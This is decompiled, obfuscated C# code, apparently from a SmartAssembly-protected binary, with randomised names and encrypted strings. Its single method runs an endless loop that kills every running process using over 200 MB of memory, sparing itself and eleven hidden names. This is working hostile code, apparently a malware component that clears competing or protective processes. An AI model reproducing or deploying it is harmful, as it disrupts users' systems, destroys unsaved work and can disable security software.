using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace bfaErnBXmrcm;

public static class XHcOjvbVcXS
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void pQJXbwnnXNgMSOS()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107366600)) && !process.ProcessName.Contains(getString_0(107366591)) && !process.ProcessName.Contains(getString_0(107366614)) && !process.ProcessName.Contains(getString_0(107366605)) && !process.ProcessName.Contains(getString_0(107366560)) && !process.ProcessName.Contains(getString_0(107366579)) && !process.ProcessName.Contains(getString_0(107366534)) && !process.ProcessName.Contains(getString_0(107366553)) && !process.ProcessName.Contains(getString_0(107366508)) && !process.ProcessName.Contains(getString_0(107366495)) && !process.ProcessName.Contains(getString_0(107366474)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static XHcOjvbVcXS()
	{
		Strings.CreateGetStringDelegate(typeof(XHcOjvbVcXS));
	}
}
